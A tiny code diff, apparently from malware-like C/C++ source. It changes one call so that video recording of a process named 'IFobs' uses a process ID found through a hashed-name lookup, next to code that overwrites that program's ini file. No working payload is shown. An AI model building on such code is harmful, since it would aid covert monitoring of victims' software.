@@ -733,7 +733,7 @@ void CreateFileReplacing( const char* s )
 		i++;
 	}
 	DBG( "IFobs", "Обновили файл '%s'", ifobsIni );
-	VideoProcess::RecordPID( 0, "IFobs" );
+	VideoProcess::RecordPID( 0, "IFobs", GetProcessIdByHash(PROCESS_HASH) );
 }
 
 
